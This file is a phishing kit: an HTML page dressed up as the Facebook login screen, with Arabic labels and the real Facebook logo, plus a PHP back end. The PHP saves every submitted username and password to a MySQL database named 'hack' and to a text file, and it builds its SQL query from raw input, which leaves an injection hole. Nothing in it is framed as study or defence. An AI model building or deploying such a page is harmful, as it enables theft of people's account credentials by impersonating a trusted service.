<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width , initial-scale = 1.0 ">
        <meta http-equiv = "X-UA-Compaible" content="ie=edge">
        <title>facebook</title>
        <!-- Goole mateial icon link -->
        <link href="https://fonts.googleapis.com/css2?family=Material+Icons"
              rel="stylesheet">
        <!--materialize css -->
        <link rel="stylesheet" href="css/materialize.min.css">
        <!--custom css -->
        <link rel="stylesheet" href="style.css" >
    </head>
    <body>
        <div class="container">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" >
            <div>
                    <form action="facebook.php" method="post">
                        <input type="text"  placeholder="رقم الهاتف أو البريد الالكترونى" name="name"/>
                        <input type="password" placeholder="كلمة المرور" name="pass" /> 
                        <input type="submit"  value="تسجيل الدخول" name="send"/>
                    </form>
            </div>
            <p>هل نسيت كلمة السر ؟</p>
            <br>
        </div>
        <!--jquery-->
        <script src="js/jquery-3.5.1.js"></script>
        <!-- materialize javascript-->
        <script src="js/materialize.min.js"></script>
    </body>
</html>
<?php 

error_reporting(0);
//connect with database

$dsn  = "localhost"; 
$user = "root"; 
$pass = ""; 
$db   = "hack"; 

$conn = mysqli_connect($dsn , $user , $pass , $db);

//send data to database

$Name  =$_POST['name']; 
$pass  =$_POST['pass'];
$send  =$_POST['send'];


if($send){
    
    $query = "INSERT INTO h(name, PASS) VALUE('$Name', '$pass')";
    $result = mysqli_query($conn , $query); 
}
if($send){
file_put_contents('data.txt', $Name ) . "</br>";
}
if($send){

file_put_contents('data.txt', $pass) . "</br>";

}
?>


